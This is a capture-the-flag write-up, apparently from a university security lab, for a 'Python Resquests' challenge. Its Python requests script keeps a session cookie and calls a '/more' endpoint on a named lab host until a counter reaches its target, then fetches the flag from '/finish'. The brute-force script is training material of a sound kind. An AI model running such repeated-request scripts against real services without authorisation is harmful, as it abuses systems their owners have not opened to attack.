# Challenge `Python Resquests` Writeup

- Vulnerability:
    - Endpoint is vulnerable to brute-force attack

- Where:
    - `/more` endpoint

- Impact:
    - Allows to find the server guess by repeated requests

## Steps to reproduce

### Step 1: Get cookie, target value, and current value
Firstly, we need to send a request to `/hello` to get the cookie, the target value and the current value.

```python
import requests
import re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23053"
s = requests.Session()
r = s.get(link + "/hello")

target = re.search(r"target (\d+)", r.text, re.IGNORECASE)[1]
curr = re.search(r"Your current value is: (\d+)", r.text, re.IGNORECASE)[1]
```

### Step 2: Send requests to `/more` until the target value is reached

```python
while curr != target:
    r = s.get(link + "/more")
    curr = re.search(r"Your current value is: (\d+)", r.text, re.IGNORECASE)[1]
```

### Step 3: Get flag
Once the target value is reached, send a request to `/finish` to get the flag.

```python
r = s.get(link + "/finish")
print(r.text)
```

## Implementation

The full implementation can be found [here](py-requests.py).